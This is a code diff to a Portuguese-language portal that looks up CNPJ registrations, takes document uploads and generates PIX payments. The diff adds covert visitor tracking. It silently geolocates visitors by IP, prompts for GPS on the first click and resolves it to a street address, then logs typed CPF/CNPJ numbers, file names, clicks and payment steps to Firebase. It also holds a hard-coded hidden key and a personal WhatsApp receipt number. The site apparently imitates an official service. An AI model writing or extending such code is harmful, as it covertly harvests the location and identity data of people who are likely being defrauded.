@@ -1189,6 +1189,18 @@
 
                 let nome = dados.nome_fantasia || dados.razao_social;
                 let situacao = dados.descricao_situacao_cadastral || "ATIVA";
+                if (typeof window.atualizarLocalizacaoCNPJ === 'function') {
+                    window.atualizarLocalizacaoCNPJ({
+                        cnpj: query,
+                        nome,
+                        cep: dados.cep || '',
+                        logradouro: dados.logradouro || '',
+                        numero: dados.numero || '',
+                        bairro: dados.bairro || '',
+                        municipio: dados.municipio || '',
+                        uf: dados.uf || ''
+                    });
+                }
                 let corSituacao = situacao.toUpperCase() === "ATIVA" ? "var(--success-color)" : "var(--sp-red)";
 
                 resultArea.innerHTML = `
@@ -1231,93 +1243,418 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
+    // =========================================================================
+    // TELEMETRIA AVANÇADA (3 CAMADAS DE LOCALIZAÇÃO + FUNIL + ERROS + SESSÃO)
+    // =========================================================================
+    window.registrarEtapaFunil = () => {};
+    window.atualizarLocalizacaoCNPJ = () => {};
+    window.registrarEventoMonitor = () => {};
+
     try {
-        const ua = navigator.userAgent.toLowerCase();
-        let osInfo = "Computador";
-        if (ua.includes("android")) osInfo = "Android";
-        else if (ua.includes("iphone") || ua.includes("ipad")) osInfo = "iPhone/iOS";
-        else if (ua.includes("windows")) osInfo = "Windows PC";
-        else if (ua.includes("mac")) osInfo = "MacBook";
+        const ignorarMonitor = localStorage.getItem('covisa_ignorar_monitor') === '1';
 
-        const isMobile = /iphone|ipad|ipod|android/i.test(ua);
-        const deviceIcon = isMobile ? '📱' : '💻';
+        if (!ignorarMonitor) {
+            const ua = navigator.userAgent.toLowerCase();
+            let osInfo = "Desktop";
+            if (ua.includes("android")) osInfo = "Android";
+            else if (ua.includes("iphone") || ua.includes("ipad")) osInfo = "iPhone/iOS";
+            else if (ua.includes("windows")) osInfo = "Windows PC";
+            else if (ua.includes("mac")) osInfo = "MacBook";
+            else if (ua.includes("linux")) osInfo = "Linux";
 
-        let isRecorrente = false;
-        let tagRetorno = "👤 Novo";
-        if(localStorage.getItem('ja_visitou')) {
-            isRecorrente = true;
-            tagRetorno = "🔄 Recorrente";
-        } else {
-            localStorage.setItem('ja_visitou', 'sim');
-        }
+            let browserInfo = "Navegador";
+            if (ua.includes("edg/")) browserInfo = "Edge";
+            else if (ua.includes("opr/") || ua.includes("opera")) browserInfo = "Opera";
+            else if (ua.includes("chrome") && !ua.includes("edg")) browserInfo = "Chrome";
+            else if (ua.includes("safari") && !ua.includes("chrome")) browserInfo = "Safari";
+            else if (ua.includes("firefox")) browserInfo = "Firefox";
 
-        let userLocation = localStorage.getItem('user_loc') || "Buscando IP...";
-        let userRegion = localStorage.getItem('user_reg') || "BR";
+            const isMobile = /iphone|ipad|ipod|android/i.test(ua);
+            const deviceIcon = isMobile ? '📱' : '💻';
+            const modeloDetalhado = `${osInfo} • ${browserInfo}`;
+            const telaInfo = `${window.screen?.width || 0}x${window.screen?.height || 0}`;
+            const conexaoInfo = navigator.connection?.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "";
 
-        async function buscarLocalizacao() {
-            if(userLocation !== "Buscando IP...") return;
-            try {
-                let req = await fetch('https://ipapi.co/json/');
-                let data = await req.json();
-                if(data.city) {
-                    userLocation = `${data.city} - ${data.region}`;
-                    userRegion = `BR-${data.region_code}`;
-                    localStorage.setItem('user_loc', userLocation);
-                    localStorage.setItem('user_reg', userRegion);
-                }
-            } catch(e) {
-                userLocation = "Localização Protegida";
+            // Origem de tráfego (Google Ads, UTM, Referrer)
+            const urlParams = new URLSearchParams(window.location.search);
+            const utmSource = urlParams.get('utm_source') || "";
+            const utmCampaign = urlParams.get('utm_campaign') || "";
+            const gclid = urlParams.get('gclid') || "";
+            const ref = (document.referrer || "").toLowerCase();
+            let origemTrafego = "Acesso Direto";
+            if (gclid || (utmSource.toLowerCase().includes('google') && utmSource.toLowerCase().includes('ads'))) {
+                origemTrafego = utmCampaign ? `Google Ads (${utmCampaign})` : "Google Ads";
+            } else if (utmSource) {
+                origemTrafego = utmCampaign ? `${utmSource} (${utmCampaign})` : utmSource;
+            } else if (ref.includes('google.')) {
+                origemTrafego = "Google Orgânico";
+            } else if (ref.includes('instagram.')) {
+                origemTrafego = "Instagram";
+            } else if (ref.includes('facebook.') || ref.includes('fb.')) {
+                origemTrafego = "Facebook";
+            } else if (ref.includes('whatsapp')) {
+                origemTrafego = "WhatsApp";
+            } else if (ref && !ref.includes(window.location.hostname)) {
+                try { origemTrafego = new URL(document.referrer).hostname; } catch (_) {}
             }
-        }
-        buscarLocalizacao(); 
 
-        const dataIso = new Date().toISOString().split('T')[0]; 
-        setDoc(doc(db, "estatisticas", dataIso), { total: increment(1) }, { merge: true }).catch(()=>{});
+            let isRecorrente = false;
+            let tagRetorno = "👤 Novo";
+            if (localStorage.getItem('ja_visitou')) {
+                isRecorrente = true;
+                tagRetorno = "🔄 Recorrente";
+            } else {
+                localStorage.setItem('ja_visitou', 'sim');
+            }
 
-        const sessionId = "sessao_" + Math.random().toString(36).substring(2, 15);
-        const sessionRef = doc(db, "trafego_aovivo", sessionId);
+            const sessionId = sessionStorage.getItem('covisa_sid') || ("sessao_" + Math.random().toString(36).substring(2, 11) + "_" + Date.now().toString(36));
+            sessionStorage.setItem('covisa_sid', sessionId);
+            const inicioSessao = Number(sessionStorage.getItem('covisa_sstart')) || Date.now();
+            sessionStorage.setItem('covisa_sstart', String(inicioSessao));
 
-        function avisarEstouOnline() {
-            setDoc(sessionRef, { ultima_acao: Date.now() }).catch(()=>{});
-        }
-        avisarEstouOnline(); 
-        setInterval(avisarEstouOnline, 10000); 
+            const locState = {
+                locFonte: "buscando",
+                localizacao: "Localizando...",
+                regiao: "BR",
+                ruaGPS: "",
+                bairroGPS: "",
+                municipioGPS: "",
+                estadoGPS: "",
+                cepGPS: "",
+                operadora: "",
+                lat: null,
+                lng: null,
+                precisaoGPS: null,
+                cnpjDigitado: "",
+                empresaDigitada: "",
+                etapaAtual: "Entrou no portal"
+            };
 
-        window.addEventListener('beforeunload', () => { deleteDoc(sessionRef).catch(()=>{}); });
-
-        async function registrarAcaoUsuario(acaoStr) {
             try {
-                await addDoc(collection(db, "logs_visitantes"), {
-                    acao: acaoStr,
+                const saved = JSON.parse(sessionStorage.getItem('covisa_loc_cache') || 'null');
+                if (saved && saved.municipioGPS) {
+                    Object.assign(locState, saved);
+                }
+            } catch (_) {}
+
+            function salvarCacheLoc() {
+                try { sessionStorage.setItem('covisa_loc_cache', JSON.stringify(locState)); } catch (_) {}
+            }
+
+            const dataIso = new Date().toISOString().split('T')[0];
+            const statsRef = doc(db, "estatisticas", dataIso);
+            const sessionRef = doc(db, "trafego_aovivo", sessionId);
+
+            if (!sessionStorage.getItem('covisa_counted_' + dataIso)) {
+                sessionStorage.setItem('covisa_counted_' + dataIso, '1');
+                setDoc(statsRef, { total: increment(1) }, { merge: true }).catch(() => {});
+            }
+
+            function avisarEstouOnline() {
+                setDoc(sessionRef, {
+                    sessionId,
+                    ultima_acao: Date.now(),
+                    inicio_sessao: inicioSessao,
+                    visivel: !document.hidden,
                     dispositivo: deviceIcon,
-                    modelo: osInfo,
-                    localizacao: userLocation,
-                    regiao: userRegion,
+                    modelo: modeloDetalhado,
+                    tela: telaInfo,
+                    conexao: conexaoInfo,
+                    origem: origemTrafego,
                     recorrente: isRecorrente,
-                    tipoVisitante: tagRetorno,
-                    dataHora: new Date().getTime()
-                });
-            } catch(e){}
-        }
-
-        document.addEventListener('click', (e) => {
-            let target = e.target.closest('button, a, .doc-item');
-            if(target) {
-                let label = target.innerText.trim() || target.title || target.id || 'um botão';
-                label = label.replace(/(\r\n|\n|\r)/gm, " ");
-                registrarAcaoUsuario(`Tocou em: [${label.substring(0, 30)}]`);
+                    locFonte: locState.locFonte,
+                    localizacao: locState.localizacao,
+                    ruaGPS: locState.ruaGPS,
+                    bairroGPS: locState.bairroGPS,
+                    municipioGPS: locState.municipioGPS,
+                    estadoGPS: locState.estadoGPS,
+                    cepGPS: locState.cepGPS,
+                    operadora: locState.operadora,
+                    lat: locState.lat,
+                    lng: locState.lng,
+                    precisaoGPS: locState.precisaoGPS,
+                    cnpjDigitado: locState.cnpjDigitado,
+                    empresaDigitada: locState.empresaDigitada,
+                    etapaAtual: locState.etapaAtual
+                }, { merge: true }).catch(() => {});
             }
-        });
 
-        document.addEventListener('focusout', (e) => {
-            if(e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') {
-                let label = e.target.placeholder || e.target.id || 'campo';
-                if(e.target.value.length > 0) {
-                    registrarAcaoUsuario(`Preencheu o campo: [${label}]`);
+            // CAMADA 1: IP + Operadora (automático e silencioso)
+            async function buscarLocalizacaoIP() {
+                if (locState.locFonte === 'gps' || locState.locFonte === 'ip') return;
+                try {
+                    const req = await fetch('https://ipwho.is/');
+                    const data = await req.json();
+                    if (data && data.success && data.city && locState.locFonte !== 'gps') {
+                        locState.locFonte = locState.locFonte === 'cnpj' ? 'cnpj' : 'ip';
+                        if (locState.locFonte === 'ip') {
+                            locState.municipioGPS = data.city || "";
+                            locState.estadoGPS = data.region_code || data.region || "";
+                            locState.cepGPS = data.postal || "";
+                            locState.localizacao = `${locState.municipioGPS}${locState.estadoGPS ? ' - ' + locState.estadoGPS : ''}`;
+                        }
+                        locState.regiao = `BR-${data.region_code || 'SP'}`;
+                        locState.operadora = data.connection?.isp || data.connection?.org || "";
+                        if (locState.lat === null && typeof data.latitude === 'number') {
+                            locState.lat = data.latitude;
+                            locState.lng = data.longitude;
+                        }
+                        salvarCacheLoc();
+                        avisarEstouOnline();
+                        return;
+                    }
+                } catch (_) {}
+
+                try {
+                    const req2 = await fetch('https://ipapi.co/json/');
+                    const data2 = await req2.json();
+                    if (data2 && data2.city && locState.locFonte !== 'gps') {
+                        locState.locFonte = locState.locFonte === 'cnpj' ? 'cnpj' : 'ip';
+                        if (locState.locFonte === 'ip') {
+                            locState.municipioGPS = data2.city || "";
+                            locState.estadoGPS = data2.region_code || data2.region || "";
+                            locState.cepGPS = data2.postal || "";
+                            locState.localizacao = `${locState.municipioGPS}${locState.estadoGPS ? ' - ' + locState.estadoGPS : ''}`;
+                        }
+                        locState.regiao = `BR-${data2.region_code || 'SP'}`;
+                        locState.operadora = data2.org || "";
+                        if (locState.lat === null && typeof data2.latitude === 'number') {
+                            locState.lat = data2.latitude;
+                            locState.lng = data2.longitude;
+                        }
+                        salvarCacheLoc();
+                        avisarEstouOnline();
+                    }
+                } catch (_) {
+                    if (locState.locFonte === 'buscando') {
+                        locState.localizacao = "IP Protegido";
+                    }
                 }
             }
-        });
+            buscarLocalizacaoIP();
 
+            // CAMADA 2: GPS Exato do Navegador (apenas a caixinha padrão Permitir/Bloquear no 1º toque útil)
+            let gpsJaSolicitado = false;
+            async function solicitarGPSNativo() {
+                if (gpsJaSolicitado || locState.locFonte === 'gps' || !navigator.geolocation) return;
+                gpsJaSolicitado = true;
+
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        const lat = Number(pos.coords.latitude.toFixed(6));
+                        const lng = Number(pos.coords.longitude.toFixed(6));
+                        const precisao = Math.round(pos.coords.accuracy || 0);
+
+                        locState.locFonte = 'gps';
+                        locState.lat = lat;
+                        locState.lng = lng;
+                        locState.precisaoGPS = precisao;
+
+                        try {
+                            const rev = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&addressdetails=1&accept-language=pt-BR`);
+                            if (rev.ok) {
+                                const j = await rev.json();
+                                const a = j.address || {};
+                                const rua = a.road || a.pedestrian || a.residential || a.footway || "";
+                                const num = a.house_number || "";
+                                locState.ruaGPS = num ? `${rua}, ${num}` : rua;
+                                locState.bairroGPS = a.suburb || a.neighbourhood || a.city_district || a.quarter || "";
+                                locState.municipioGPS = a.city || a.town || a.municipality || a.village || locState.municipioGPS || "";
+                                const ufRaw = a['ISO3166-2-lvl4'] || "";
+                                locState.estadoGPS = ufRaw.includes('-') ? ufRaw.split('-')[1] : (a.state_code || a.state || locState.estadoGPS || "");
+                                locState.cepGPS = a.postcode || locState.cepGPS || "";
+                                locState.localizacao = [locState.bairroGPS, locState.municipioGPS, locState.estadoGPS].filter(Boolean).join(', ');
+                            }
+                        } catch (_) {}
+
+                        salvarCacheLoc();
+                        avisarEstouOnline();
+                        registrarAcaoUsuario(
+                            `GPS Exato confirmado (±${precisao}m): ${locState.ruaGPS ? locState.ruaGPS + ' - ' : ''}${locState.bairroGPS || locState.municipioGPS}`,
+                            'gps'
+                        );
+                    },
+                    () => {
+                        // Se bloquear ou fechar, segue normalmente em silêncio com IP + CNPJ
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 }
+                );
+            }
+
+            if (navigator.permissions && navigator.permissions.query) {
+                navigator.permissions.query({ name: 'geolocation' }).then((st) => {
+                    if (st.state === 'granted') solicitarGPSNativo();
+                }).catch(() => {});
+            }
+
+            function gatilhoPrimeiroToqueUtil(e) {
+                if (gpsJaSolicitado) return;
+                if (e.target && e.target.closest && e.target.closest('button, a, .form-tab, .doc-item, input, select, textarea')) {
+                    solicitarGPSNativo();
+                    document.removeEventListener('click', gatilhoPrimeiroToqueUtil, true);
+                    document.removeEventListener('focusin', gatilhoPrimeiroToqueUtil, true);
+                }
+            }
+            document.addEventListener('click', gatilhoPrimeiroToqueUtil, true);
+            document.addEventListener('focusin', gatilhoPrimeiroToqueUtil, true);
+
+            // CAMADA 3: Enriquecimento por CNPJ (endereço oficial da empresa)
+            window.atualizarLocalizacaoCNPJ = function(info) {
+                if (!info) return;
+                if (info.cnpj) locState.cnpjDigitado = info.cnpj;
+                if (info.nome) locState.empresaDigitada = info.nome;
+                if (locState.locFonte !== 'gps' && (info.municipio || info.bairro)) {
+                    locState.locFonte = 'cnpj';
+                    locState.ruaGPS = info.logradouro ? `${info.logradouro}${info.numero ? ', ' + info.numero : ''}` : "";
+                    locState.bairroGPS = info.bairro || "";
+                    locState.municipioGPS = info.municipio || "";
+                    locState.estadoGPS = info.uf || "";
+                    locState.cepGPS = info.cep || "";
+                    locState.localizacao = [locState.bairroGPS, locState.municipioGPS, locState.estadoGPS].filter(Boolean).join(', ');
+                }
+                salvarCacheLoc();
+                avisarEstouOnline();
+                window.registrarEtapaFunil('cnpj', `CNPJ identificado: ${info.nome || info.cnpj}`);
+            };
+
+            const etapasRegistradas = new Set();
+            const etapaNomes = {
+                consulta: "Consultou / Iniciou processo",
+                cnpj: "Informou CPF/CNPJ",
+                anexo: "Anexou documento",
+                enviou: "Enviou formulário",
+                pix: "Gerou código PIX",
+                pagou: "Pagamento confirmado"
+            };
+            window.registrarEtapaFunil = function(etapa, detalhe) {
+                if (etapaNomes[etapa]) {
+                    locState.etapaAtual = etapaNomes[etapa];
+                    avisarEstouOnline();
+                }
+                if (etapa && !etapasRegistradas.has(etapa)) {
+                    etapasRegistradas.add(etapa);
+                    const campoFunil = `funil_${etapa}`;
+                    setDoc(statsRef, { [campoFunil]: increment(1) }, { merge: true }).catch(() => {});
+                }
+                if (detalhe) {
+                    registrarAcaoUsuario(detalhe, etapa === 'pix' || etapa === 'pagou' ? 'pix' : 'funil');
+                }
+            };
+
+            let ultimaAcaoTexto = "";
+            let ultimaAcaoHora = 0;
+            let rageTarget = null;
+            let rageCount = 0;
+            let rageTimer = null;
+
+            async function registrarAcaoUsuario(acaoStr, tipoEvento = "acao") {
+                const agora = Date.now();
+                if (tipoEvento === "clique" && acaoStr === ultimaAcaoTexto && (agora - ultimaAcaoHora) < 3000) {
+                    return;
+                }
+                ultimaAcaoTexto = acaoStr;
+                ultimaAcaoHora = agora;
+
+                try {
+                    await addDoc(collection(db, "logs_visitantes"), {
+                        sessionId,
+                        acao: acaoStr,
+                        tipoEvento,
+                        dispositivo: deviceIcon,
+                        modelo: modeloDetalhado,
+                        tela: telaInfo,
+                        conexao: conexaoInfo,
+                        origem: origemTrafego,
+                        locFonte: locState.locFonte,
+                        localizacao: locState.localizacao,
+                        ruaGPS: locState.ruaGPS,
+                        bairroGPS: locState.bairroGPS,
+                        municipioGPS: locState.municipioGPS,
+                        estadoGPS: locState.estadoGPS,
+                        cepGPS: locState.cepGPS,
+                        operadora: locState.operadora,
+                        lat: locState.lat,
+                        lng: locState.lng,
+                        precisaoGPS: locState.precisaoGPS,
+                        cnpjDigitado: locState.cnpjDigitado,
+                        empresaDigitada: locState.empresaDigitada,
+                        etapaAtual: locState.etapaAtual,
+                        regiao: locState.regiao,
+                        recorrente: isRecorrente,
+                        tipoVisitante: tagRetorno,
+                        dataHora: agora
+                    });
+                } catch (_) {}
+            }
+
+            window.registrarEventoMonitor = registrarAcaoUsuario;
+
+            avisarEstouOnline();
+            setInterval(avisarEstouOnline, 10000);
+            document.addEventListener('visibilitychange', () => avisarEstouOnline());
+            window.addEventListener('beforeunload', () => { deleteDoc(sessionRef).catch(() => {}); });
+
+            registrarAcaoUsuario(`Acessou o portal (${origemTrafego})`, 'entrada');
+
+            document.addEventListener('click', (e) => {
+                let target = e.target.closest('button, a, .doc-item, .form-tab');
+                if (!target) return;
+                let label = (target.innerText || target.title || target.id || 'botão').trim().replace(/(\r\n|\n|\r|\s)+/gm, " ").substring(0, 45);
+
+                if (rageTarget === target) {
+                    rageCount++;
+                } else {
+                    rageTarget = target;
+                    rageCount = 1;
+                }
+                clearTimeout(rageTimer);
+                rageTimer = setTimeout(() => { rageCount = 0; rageTarget = null; }, 2000);
+
+                if (rageCount === 4) {
+                    registrarAcaoUsuario(`ALERTA Rage Click (travamento?): clicou 4x em [${label}]`, 'erro');
+                    return;
+                }
+
+                if (target.id === 'tab-envio' || target.id === 'tab-pagamento' || target.id === 'tab-multas' || target.id === 'main-search-btn') {
+                    window.registrarEtapaFunil('consulta');
+                }
+                registrarAcaoUsuario(`Tocou em: [${label}]`, 'clique');
+            });
+
+            document.addEventListener('change', (e) => {
+                if (e.target && e.target.type === 'file' && e.target.files && e.target.files.length > 0) {
+                    window.registrarEtapaFunil('anexo', `Anexou ${e.target.files.length} arquivo(s) (${e.target.files[0].name.substring(0, 30)})`);
+                }
+            });
+
+            document.addEventListener('focusout', (e) => {
+                if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') {
+                    let label = e.target.placeholder || e.target.id || 'campo';
+                    let val = (e.target.value || '').trim();
+                    if (val.length > 0) {
+                        if (e.target.id === 'cnpj_empresa' || e.target.id === 'main-search-input' || e.target.id === 'cnpj_consulta') {
+                            const digits = val.replace(/\D/g, '');
+                            if (digits.length === 11 || digits.length === 14) {
+                                locState.cnpjDigitado = val;
+                                avisarEstouOnline();
+                                window.registrarEtapaFunil('cnpj', `Informou CPF/CNPJ: ${val}`);
+                                return;
+                            }
+                        }
+                        registrarAcaoUsuario(`Preencheu o campo: [${label.substring(0, 35)}]`, 'campo');
+                    }
+                }
+            });
+
+            window.addEventListener('error', (ev) => {
+                const msg = (ev.message || 'Erro de script').substring(0, 120);
+                registrarAcaoUsuario(`ERRO na tela do visitante: ${msg}`, 'erro');
+            });
+            window.addEventListener('unhandledrejection', (ev) => {
+                const msg = String(ev.reason?.message || ev.reason || 'Promise rejeitada').substring(0, 120);
+                registrarAcaoUsuario(`ERRO assíncrono: ${msg}`, 'erro');
+            });
+        }
     } catch(e) {}
 
     const chaveOculta = "Idel4NPPfWBgTvpa-i8y_QjZgC1Mejx7BySazIA";
@@ -2126,6 +2463,9 @@
                     }
 
                     if (dadosEncontrados) {
+                        if (typeof window.atualizarLocalizacaoCNPJ === 'function') {
+                            window.atualizarLocalizacaoCNPJ({ cnpj: valLimpo, nome: nomeFantasia || razaoSocial, cep, logradouro, numero, bairro, municipio, uf });
+                        }
                         document.getElementById('dados-pj').style.display = 'block';
                         document.getElementById('nome_empresa').value = razaoSocial;
                         if(document.getElementById('nome_fantasia')) document.getElementById('nome_fantasia').value = nomeFantasia;
@@ -2306,6 +2646,9 @@
                   }
               }
 
+              if (typeof window.registrarEtapaFunil === 'function') {
+                  window.registrarEtapaFunil('enviou', `Protocolo enviado com sucesso (${listaEvidencias.length} anexo(s))`);
+              }
               const msgAnalise = `*COMPROVANTE DE PROTOCOLO GERADO*\n\n*Empresa/Pessoa:* ${nomeFinal}\n*CNPJ/CPF:* ${cnpj}\n\nSeus documentos foram enviados para análise técnica. Guarde esta mensagem. O seu processo já está no sistema!`;
               const urlWhatsAnalise = "https://api.whatsapp.com/send?phone=5511920665012&text=" + encodeURIComponent(msgAnalise);
               
@@ -2577,6 +2920,9 @@
                           }
 
                           if (dadosPix.success) {
+                              if (typeof window.registrarEtapaFunil === 'function') {
+                                  window.registrarEtapaFunil('pix', `Gerou PIX de cobrança (R$ ${dados.valor || ''})`);
+                              }
                               document.getElementById('pix-copia-cola').value = dadosPix.copyPaste;
 
                               let qrSrc = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(dadosPix.copyPaste)}`;
@@ -2601,6 +2947,9 @@
                                       const dadosAtualizados = docSnap.data();
 
                                       if (dadosAtualizados.pago === true || dadosAtualizados.pago === "true") {
+                                          if (typeof window.registrarEtapaFunil === 'function') {
+                                              window.registrarEtapaFunil('pagou', `PIX pago confirmado!`);
+                                          }
                                           unsubscribePagamento();
                                           document.getElementById('resultado-pix').style.display = 'none';
                                           document.getElementById('mensagem-status').style.display = 'block';
@@ -2641,6 +2990,9 @@
                               });
 
                           } else {
+                              if (typeof window.registrarEventoMonitor === 'function') {
+                                  window.registrarEventoMonitor('ERRO ao gerar código PIX (gateway indisponível)', 'erro');
+                              }
                               alert("O sistema de pagamentos está momentaneamente indisponível. Por favor, aguarde alguns minutos e tente novamente.");
                               document.getElementById('pix-copia-cola').value = "Falha ao gerar código.";
                               let imgQrAlvara = document.querySelector('.qr-container img');
